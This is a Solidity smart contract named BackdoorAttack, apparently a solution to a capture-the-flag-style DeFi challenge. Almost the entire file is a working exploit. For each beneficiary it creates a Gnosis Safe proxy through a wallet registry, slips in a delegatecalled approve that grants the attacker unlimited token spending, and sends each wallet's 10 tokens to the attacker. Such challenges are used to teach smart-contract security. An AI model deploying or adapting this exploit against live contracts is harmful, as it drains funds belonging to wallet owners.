// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "./WalletRegistry.sol";

interface ProxyFactory {
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) external returns (GnosisSafeProxy proxy);
}

contract BackdoorAttack {

    uint256 private constant MAX_OWNERS = 1;
    uint256 private constant MAX_THRESHOLD = 1;

    ProxyFactory public immutable proxyFactory;
    WalletRegistry public immutable walletRegister;
    address public immutable masterCopy;
    IERC20 public immutable token;

    address[] private beneficiaries = new address[](4);

    constructor(
        WalletRegistry _walletRegister, 
        ProxyFactory _proxyFactory, 
        address _masterCopy, 
        IERC20 _token,
        address[] memory _beneficiaries
    ) {
        walletRegister = _walletRegister;
        proxyFactory = _proxyFactory;
        token = _token;
        masterCopy = _masterCopy;

        beneficiaries = _beneficiaries;
    }

    function attack() external {
        for(uint i=0; i<beneficiaries.length; i++) {

            //set address 0 to current beneficiaty
            address[] memory owners = new address[](1);
            owners[0] = beneficiaries[i];

            // excode function for execution then call create Proxy
            // createProxyWithCallback will call the callback, which is walletRegister Contract
            // in walletRegister will trigger proxyCreated().
            bytes memory encodedApprove = abi.encodeWithSignature("approve(address)", address(this));
            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners, 1, address(this), encodedApprove, address(0), 0, 0, 0);
            GnosisSafeProxy proxy = proxyFactory.createProxyWithCallback(masterCopy, initializer, 0, IProxyCreationCallback(walletRegister));

            //Each round this contract will receive 10 ethers -> send it to attacker
            token.transferFrom(address(proxy), tx.origin, 10 ether);
        }
    }

    function approve(address spender) external {
        token.approve(spender, type(uint256).max);
    }
    
    receive() external payable{}
}